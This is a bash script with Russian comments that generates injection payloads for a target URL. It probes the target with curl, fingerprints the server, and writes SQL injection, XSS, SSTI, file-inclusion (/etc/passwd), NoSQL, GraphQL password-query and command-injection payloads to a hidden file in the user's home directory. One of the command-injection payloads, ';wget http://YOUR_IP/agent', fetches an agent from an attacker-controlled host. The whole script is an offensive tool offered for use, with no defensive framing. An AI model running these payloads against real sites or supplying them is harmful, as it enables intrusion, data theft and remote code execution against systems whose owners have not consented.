#!/bin/bash
# Генератор инъекций — создаёт пейлоады под конкретную цель
TARGET=$1
[ -z "$TARGET" ] && echo "Usage: $0 http://target.com" && exit 1

OUT="$HOME/.shadow_generated_payloads.txt"
> "$OUT"

echo "[GEN] Анализирую цель для генерации инъекций..."

# Собираем контекст
HTML=$(curl -sk --max-time 10 "$TARGET" 2>/dev/null)
HEADERS=$(curl -sk -I --max-time 10 "$TARGET" 2>/dev/null)
SERVER=$(echo "$HEADERS" | grep -i "Server:" | head -1)

# Определяем технологии и генерируем целевые пейлоады
echo "[GEN] Генерирую пейлоады..."

# SQLi — если есть параметры
if echo "$TARGET" | grep -q "?" || echo "$HTML" | grep -qi "<form"; then
    echo "[GEN] SQLi payloads:"
    for p in "' OR '1'='1" "1' AND 1=1--" "1' AND SLEEP(2)--" "1' UNION SELECT NULL--" "admin'--"; do
        echo "  $p" >> "$OUT"
    done
fi

# XSS — если есть отражение
if echo "$HTML" | grep -qi "<input\|<form\|<textarea"; then
    echo "[GEN] XSS payloads:"
    for p in "<script>alert(1)</script>" "<img src=x onerror=alert(1)>" "<svg onload=alert(1)>" "javascript:alert(1)"; do
        echo "  $p" >> "$OUT"
    done
fi

# SSTI — если Python/Ruby/Java стек
if echo "$SERVER" | grep -qi "Python\|Ruby\|Java\|Tomcat\|Jinja"; then
    echo "[GEN] SSTI payloads:"
    for p in "{{7*7}}" "{{config}}" "${7*7}" "<%=7*7%>"; do
        echo "  $p" >> "$OUT"
    done
fi

# LFI — если PHP стек
if echo "$SERVER" | grep -qi "PHP\|Apache"; then
    echo "[GEN] LFI payloads:"
    for p in "../../etc/passwd" "php://filter/convert.base64-encode/resource=index" "....//....//etc/passwd"; do
        echo "  $p" >> "$OUT"
    done
fi

# NoSQL — если API
if echo "$HTML" | grep -qi "api\|graphql\|json\|rest"; then
    echo "[GEN] NoSQL payloads:"
    for p in '{"$gt":""}' '{"$ne":null}' '{"$where":"sleep(1000)"}' "';return true;var foo='"; do
        echo "  $p" >> "$OUT"
    done
fi

# GraphQL — если есть эндпоинт
if curl -sk --max-time 5 "$TARGET/graphql" 2>/dev/null | grep -qi "query\|__schema"; then
    echo "[GEN] GraphQL payloads:"
    for p in '{__schema{types{name}}}' '{user(id:1){password}}' 'query{__typename}'; do
        echo "  $p" >> "$OUT"
    done
fi

# CMDi — если есть exec параметры
if echo "$HTML" | grep -qi "ping\|cmd\|exec\|run\|shell"; then
    echo "[GEN] CMDi payloads:"
    for p in ";id" "|id" '`id`' '$(id)' ";wget http://YOUR_IP/agent"; do
        echo "  $p" >> "$OUT"
    done
fi

echo "[GEN] Сгенерировано пейлоадов: $(wc -l < "$OUT")"
echo "[GEN] Файл: $OUT"
cat "$OUT"
